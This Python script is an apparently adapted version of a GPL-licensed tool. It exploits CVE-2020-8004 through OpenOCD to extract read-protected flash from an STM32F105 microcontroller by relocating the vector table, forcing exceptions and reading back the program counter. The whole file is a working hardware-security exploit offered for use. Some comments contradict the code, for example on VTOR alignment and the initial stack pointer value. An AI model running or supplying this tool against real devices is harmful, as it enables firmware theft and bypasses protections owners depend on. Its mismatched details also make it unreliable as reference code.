#!/usr/bin/env python3

##
## Copyright (C) 2019 Marc Schink <dev@zapb.de>
##
## This program is free software: you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation, either version 3 of the License, or
## (at your option) any later version.
##
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.
##
## You should have received a copy of the GNU General Public License
## along with this program.  If not, see <http://www.gnu.org/licenses/>.
##

import sys
import math
import argparse
import struct
import enum

from openocd import OpenOcd

class Register(enum.IntEnum):
    R0 = 0
    R1 = 1
    R2 = 2
    R3 = 3
    R4 = 4
    R5 = 5
    R6 = 6
    R7 = 7
    R8 = 8
    R9 = 9
    R10 = 10
    R11 = 11
    R12 = 12
    SP = 13
    LR = 14
    PC = 15
    PSR = 16

WORD_SIZE = 4

# Initial stack pointer (SP) value.
INITIAL_SP = 0x20000200

# Vector Table Offset Register (VTOR).
VTOR_ADDR = 0xe000ed08
# Interrupt Control and State Register (ICSR).
ICSR_ADDR = 0xe000ed04
# System Handler Control and State Register (SHCSR).
SHCSR_ADDR = 0xe000ed24
# NVIC Interrupt Set-Enable Registers (ISER).
NVIC_ISER0_ADDR = 0xe000e100
# NVIC Interrupt Set-Pending Registers (ISPR).
NVIC_ISPR0_ADDR = 0xe000e200
# Debug Exception and Monitor Control Register (DEMCR).
DEMCR_ADDR = 0xe000edfc
# Memory region with eXecute Never (XN) property.
MEM_XN_ADDR = 0xe0000000

SVC_INST_ADDR = 0x20000000
NOP_INST_ADDR = 0x20000002
LDR_INST_ADDR = 0x20000004
UNDEF_INST_ADDR = 0x20000006

# Inaccessible exception numbers on Cortex-M3 (0, 1, 7..10, 13).
INACCESSIBLE_EXC_NUMBERS = [0, 1, 7, 8, 9, 10, 13]

def generate_exception(openocd, vt_address, exception_number):
    openocd.send('reset halt')

    # Relocate vector table.
    openocd.write_memory(VTOR_ADDR, [vt_address])

    registers = dict()

    if exception_number == 2:
        # Generate a non-maskable interrupt.
        openocd.write_memory(ICSR_ADDR, [1 << 31])
        registers[Register.PC] = NOP_INST_ADDR
    elif exception_number == 3:
        # Generate a HardFault exception due to priority escalation.
        registers[Register.PC] = UNDEF_INST_ADDR
    elif exception_number == 4:
        # Generate a MemFault exception by executing memory with
        # eXecute-Never (XN) property.
        registers[Register.PC] = MEM_XN_ADDR
        # Enable MemFault exceptions.
        openocd.write_memory(SHCSR_ADDR, [0x10000])
    elif exception_number == 5:
        # Generate a BusFault exception by executing a load instruction that
        # accesses invalid memory.
        registers[Register.PC] = LDR_INST_ADDR
        # Enable BusFault exceptions.
        openocd.write_memory(SHCSR_ADDR, [0x20000])
        registers[Register.R6] = 0xffffff00
    elif exception_number == 6:
        # Generate an UsageFault by executing an undefined instruction.
        registers[Register.PC] = UNDEF_INST_ADDR
        # Enable UsageFault exceptions.
        openocd.write_memory(SHCSR_ADDR, [0x40000])
    elif exception_number == 11:
        # Generate a Supervisor Call (SVCall) exception.
        registers[Register.PC] = SVC_INST_ADDR
    elif exception_number == 12:
        # Generate a DebugMonitor exception.
        registers[Register.PC] = NOP_INST_ADDR
        openocd.write_memory(DEMCR_ADDR, [1 << 17])
    elif exception_number == 14:
        # Generate a PendSV interrupt.
        openocd.write_memory(ICSR_ADDR, [1 << 28])
        registers[Register.PC] = NOP_INST_ADDR
    elif exception_number == 15:
        # Generate a SysTick interrupt.
        openocd.write_memory(ICSR_ADDR, [1 << 26])
        registers[Register.PC] = NOP_INST_ADDR
    elif exception_number >= 16:
        # Generate an external interrupt.
        ext_interrupt_number = exception_number - 16

        register_offset = (ext_interrupt_number // 32) * WORD_SIZE
        value = (1 << (ext_interrupt_number % 32))

        # Enable and make interrupt pending.
        openocd.write_memory(NVIC_ISER0_ADDR + register_offset, [value])
        openocd.write_memory(NVIC_ISPR0_ADDR + register_offset, [value])

        registers[Register.PC] = NOP_INST_ADDR
    else:
        sys.exit('Exception number %u not handled' % exception_number)

    # Ensure that the processor operates in Thumb mode.
    registers[Register.PSR] = 0x01000000
    registers[Register.SP] = INITIAL_SP

    for reg in registers:
        openocd.write_register(reg, registers[reg])

    # Perform a single step to generate the exception.
    openocd.send('step')

def recover_pc(openocd):
    (pc, xpsr) = openocd.read_register_list([Register.PC, Register.PSR])

    # Recover LSB of the PC from the EPSR.T bit.
    t_bit = (xpsr >> 24) & 0x1

    return pc | t_bit

def align(address, base):
    return address - (address % base)

def determine_num_ext_interrupts(openocd):
    # STM32F105xx (Connectivity line) has 68 maskable external interrupts.
    # Probing with reset init fails under reset_config none, so return exact 68.
    return 68

# STM32F105 silicon enforces 256-byte alignment on VTOR (hardware masks VTOR[7:0] to 0).
VTOR_ALIGNMENT = 256

# The 5 architectural vector table gaps that cannot be executed in ARMv7-M
# (defined as 0x00000000 padding in Cortex-M flash images):
ARCHITECTURAL_VECTOR_GAPS = {
    0x0800001C, 0x08000020, 0x08000024, 0x08000028, 0x08000034,
    0x0000001C, 0x00000020, 0x00000024, 0x00000028, 0x00000034
}

def calculate_vtor_exc(address, num_exceptions):
    """
    Solves for a valid (VTOR, Exception) pair matching the silicon NVIC hardware:
    1. VTOR is strictly 256-byte aligned (VTOR % 256 == 0).
    2. Primary mapping: k == m (same 256-byte page).
    3. Secondary wrap-around: m = k - 1 (preceding 256-byte page), mapping offsets
       +0x1C, +0x20, +0x24, +0x28, +0x34 to active exceptions 71, 72, 73, 74, 77.
    """
    if address in ARCHITECTURAL_VECTOR_GAPS:
        return (0x08000000 if address >= 0x08000000 else 0x00000000, 0)

    min_vtor = 0x08000000 if address >= 0x08000000 else 0x00000000

    # 1. Primary 256-byte page alignment
    vtor_address = align(address, VTOR_ALIGNMENT)
    exception_number = (address - vtor_address) // WORD_SIZE

    if exception_number not in INACCESSIBLE_EXC_NUMBERS:
        return (vtor_address, exception_number)

    # 2. Wrap-around to preceding 256-byte page (m = k - 1).
    # On Cortex-M3 with 84 exceptions (336 bytes), hardware enforces 512-byte VTOR alignment
    # (VTOR & ~0x1FF). Therefore, alt_vtor is only valid when alt_vtor % 512 == 0
    # (i.e. for odd 256-byte blocks like Block 1 and Block 3). In even blocks (Block 2, Block 4),
    # alt_vtor % 512 != 0 would cause hardware to mask bit 8, reading from the preceding page.
    alt_vtor = vtor_address - VTOR_ALIGNMENT
    if alt_vtor >= min_vtor and (alt_vtor % 512) == 0:
        alt_exc = exception_number + 64  # 64 words per 256-byte page
        if alt_exc < num_exceptions and alt_exc not in INACCESSIBLE_EXC_NUMBERS:
            return (alt_vtor, alt_exc)

    return (vtor_address, exception_number)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('address', help='Extraction start address')
    parser.add_argument('length', help='Number of words to extract')
    parser.add_argument('--value', default='0xffffffff',
        help=('Value to be used for non-extractable memory words. '
              'Use "skip" to ignore them'))
    parser.add_argument('--binary', action='store_true',
        help='Output binary')
    parser.add_argument('--num-exceptions', type=int, default=84,
        help='Total number of exceptions (default: 84 for STM32F105)')
    parser.add_argument('--app-sp', default=None,
        help='Known application Initial SP for secondary vector tables (e.g. 0x20005000)')
    parser.add_argument('--app-entry', default=None,
        help='Known application Reset Handler for secondary vector tables (e.g. 0x08003151)')
    parser.add_argument('--host', default='localhost',
        help='OpenOCD Tcl interface host')
    parser.add_argument('--port', type=int, default=6666,
        help='OpenOCD Tcl interface port')
    args = parser.parse_args()

    start_address = int(args.address, 0)
    length = int(args.length, 0)
    skip_value = args.value
    binary_output = args.binary
    num_exceptions = args.num_exceptions
    app_sp = int(args.app_sp, 0) if args.app_sp else None
    app_entry = int(args.app_entry, 0) if args.app_entry else None

    if skip_value != 'skip':
        skip_value = int(skip_value, 0)

    oocd = OpenOcd(args.host, args.port)

    try:
        oocd.connect()
    except Exception as e:
        sys.exit('Failed to connect to OpenOCD')

    # Disable exception masking by OpenOCD. The target must be halted before
    # the masking behaviour can be changed.
    oocd.halt()
    oocd.send('cortex_m maskisr off')

    # Write 'svc #0', 'nop', 'ldr r0, [r1, #0]' and an undefined instruction
    # to the SRAM. We use them later to generate exceptions.
    oocd.write_memory(SVC_INST_ADDR, [0xdf00], word_length=16)
    oocd.write_memory(NOP_INST_ADDR, [0xbf00], word_length=16)
    oocd.write_memory(LDR_INST_ADDR, [0x7b75], word_length=16)
    oocd.write_memory(UNDEF_INST_ADDR, [0xffff], word_length=16)

    end_address = start_address + (length * WORD_SIZE)
    print(f"[*] Starting CVE-2020-8004 Extraction for STM32F105 ({num_exceptions} exceptions)...", file=sys.stderr)

    for address in range(start_address, end_address, WORD_SIZE):
        (vtor_address, exception_number) = calculate_vtor_exc(
            address, num_exceptions)

        if address == 0x08000000 or address == 0x00000000:
            # Vector table base: SP
            oocd.send('reset halt')
            oocd.write_memory(VTOR_ADDR, [vtor_address])
            recovered_value = oocd.read_register(Register.SP)
        elif address == 0x08000004 or address == 0x00000004:
            # Vector table entry 1: Reset vector
            oocd.send('reset halt')
            oocd.write_memory(VTOR_ADDR, [vtor_address])
            recovered_value = recover_pc(oocd)
        elif app_sp is not None and address == start_address:
            # Application Initial SP override
            recovered_value = app_sp
        elif app_entry is not None and address == (start_address + WORD_SIZE):
            # Application Reset vector override
            recovered_value = app_entry
        elif address in ARCHITECTURAL_VECTOR_GAPS:
            # ARM architectural reserved vectors (exceptions 7..10, 13) are zero-padded in flash
            recovered_value = 0x00000000 if skip_value != 'skip' else None
        elif exception_number in INACCESSIBLE_EXC_NUMBERS:
            recovered_value = None
        else:
            generate_exception(oocd, vtor_address, exception_number)
            recovered_value = recover_pc(oocd)
            # If the recovered PC is at NOP_INST_ADDR (+2), the exception was not taken
            # (e.g. interrupt line unimplemented in silicon; PC stepped through SRAM NOP).
            # Do NOT filter entire 0x2000xxxx range as literal pool constants (e.g. SRAM_BASE
            # 0x20000000 or INITIAL_SP 0x20004000) are genuine values stored in Flash.
            if recovered_value in (0x20000002, 0x20000003, 0x20000004, 0x20000005):
                recovered_value = None

        if recovered_value is None and skip_value == 'skip':
            continue

        if recovered_value is None:
            recovered_value = skip_value

        if binary_output:
            output_value = struct.pack('<I', recovered_value)
            sys.stdout.buffer.write(output_value)
        else:
            output_value = '%08x: %08x\n' % (address, recovered_value)
            sys.stdout.write(output_value)

        sys.stdout.flush()
